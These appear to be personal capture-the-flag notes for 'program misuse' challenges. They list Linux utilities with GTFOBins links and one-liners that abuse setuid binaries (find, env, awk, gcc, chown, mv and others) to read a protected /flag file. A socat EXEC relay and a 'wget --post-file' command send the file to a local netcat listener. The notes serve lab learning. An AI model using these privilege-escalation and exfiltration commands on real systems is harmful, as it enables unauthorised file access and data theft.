
`ldd <file path>` -  prints  the  shared objects (shared libraries) required by each program or shared object specified on  the command line. 

`dmesg | tail -n1` - Check kernel log #Buffer-overflow [[Buffer Overflow]]

`find -exec COMMAND` - Find can be used to find a file but also be used to exec a command
- `hacker@program-misuse~level3:/challenge/bin$ find /flag -exec cat \{\} \;

`strace` - prints out all system calls used by a binary

#privilege-escalation
`gzip` - https://gtfobins.github.io/gtfobins/gzip/
`bzip2` - https://gtfobins.github.io/gtfobins/bzip2/
`zip` - https://gtfobins.github.io/gtfobins/zip/
`tar` - https://gtfobins.github.io/gtfobins/tar/
`ar` - https://gtfobins.github.io/gtfobins/ar/
`cpio` - https://gtfobins.github.io/gtfobins/cpio/
`genisoimage` - https://gtfobins.github.io/gtfobins/genisoimage/ and https://g0ldf15h.github.io/posts/pwn_college/program_misuse/#23-genisoimage

`env` - list environment variables. Can be used for privilege escalation `env cat flag.txt`
`find` -find a file - Can be used for privilege escalation `find /flag -exec cat {} \;`
`make` - create a makefile - https://gtfobins.github.io/gtfobins/make/ and https://g0ldf15h.github.io/posts/pwn_college/program_misuse/#24-env
`nice` - do something with process scheduling - for privilege escalation - `nice -n 20 cat flag`
`timeout` - run a command with a time limit - `timeout 100 cat /flag`
`stdbuf` - run a command with modified buffering operations for standard streams ` stdbuf -e 1 cat /flag`
`watch` - execute a program periodically `watch -x cat /flag`
`setarch` - change the reported architecture in new program env `setarch -R cat /flag`
`socat` - multipurpose relay:

```
Open one terminal and start the netcat listener:
> nc -l 9999

In another terminal, use socat to connect to the listener and execute the command:
> socat TCP4:localhost:9999 EXEC:"cat /flag"
```

`awk` - text processing language - `awk '{ print $1 }' /flag`
`sed` - stream editor `sed -n '1p' /flag`
`ed` - standard text editor `ed /flag` > `p`
`chown` - Change owner `/challenge/bin/chown 1000 /flag`
`chmod` - Change permissions
`cp` - copy `cp --no-preserve=mode,ownership flag boink`
`mv` - move a file - https://hackmd.io/@jvX0z8tMSVy82TKMOd78zw/B1V06QEVo - This is basically renaming a file to the one that gets the sticky bit set for example /cat
`mv /usr/bin/cat /challenge/bin/mv` > `mv /flag`

`dmesg` - Display or control kernel ring buffer `/challenge/bin/dmesg -F /flag `
`date` - display the date `date -f /flag`
`wc` - print stuff `/challenge/bin/wc --files0-from=/flag`
`gcc` - compiler `gcc @/flag` | `-shared` compile as shared lib |
	
`as` - compiler `as @/flag`
`wget` - file transfer `nc -lp 8888 & wget --post-file=/flag http://127.0.0.1:8888 // Best solution`





scripting:
https://g0ldf15h.github.io/posts/pwn_college/program_misuse/#23-genisoimage